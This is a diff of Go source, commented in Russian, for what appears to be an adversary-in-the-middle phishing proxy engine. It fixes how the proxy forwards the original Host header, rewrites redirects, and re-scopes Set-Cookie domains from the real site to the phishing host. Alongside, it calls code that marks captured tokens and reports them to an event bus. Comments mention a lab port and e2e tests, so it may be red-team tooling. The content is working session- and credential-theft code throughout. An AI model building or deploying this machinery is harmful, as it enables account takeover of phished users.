@@ -182,15 +182,17 @@ func (e *Engine) ServeHTTP(w http.ResponseWriter, r *http.Request) {
 			fwd = phishHost
 		}
 		origDirector(req)
-		// e2e override: не переписываем Host если цель локальная
-		if e.upstream == nil {
-			req.Host = origHost
-		}
+		// Host апстриму — всегда оригинал (и в prod, и в e2e-override:
+		// httptest-сервер Host игнорирует, а asserts его проверяют).
+		req.Host = origHost
 		req.Header.Set("X-Forwarded-Host", fwd)
 	}
 	rp.ModifyResponse = func(resp *http.Response) error {
-		rewriteRedirect(resp, origHost, stripPort(phishHost))
-		rewriteCookies(resp, origHost, host.Domain, stripPort(phishHost))
+		// Хост как пришел, с портом (лаб :8443 сохраняет работоспособность
+		// редиректов; в проде на 443 порта нет — поведение то же).
+		// Cookie-Domain внутри rewriteCookies чистится от порта отдельно.
+		rewriteRedirect(resp, origHost, phishHost)
+		rewriteCookies(resp, origHost, host.Domain, phishHost)
 		markTokens(resp, ph, e.bus, r, sid)
 		scanLocation(resp, ph, e.bus, r, sid)
 		return e.rewriteBody(resp, ph, host, r, sid)
@@ -447,15 +449,16 @@ func rewriteRedirect(resp *http.Response, origHost, phishHost string) {
 }
 
 // rewriteCookies переписывает Domain в Set-Cookie с оригинала на фиш.
+// Хост — как пришел (с портом для lab), Domain — всегда без порта.
 func rewriteCookies(resp *http.Response, origHost, origDomain, phishHost string) {
 	cookies := resp.Header.Values("Set-Cookie")
 	if len(cookies) == 0 {
 		return
 	}
 	resp.Header.Del("Set-Cookie")
-	phishBase := phishHost
-	if i := strings.Index(phishHost, "."); i > 0 {
-		phishBase = phishHost[i+1:]
+	phishBase := stripPort(phishHost)
+	if i := strings.Index(phishBase, "."); i > 0 {
+		phishBase = phishBase[i+1:]
 	}
 	for _, c := range cookies {
 		if origHost != "" {
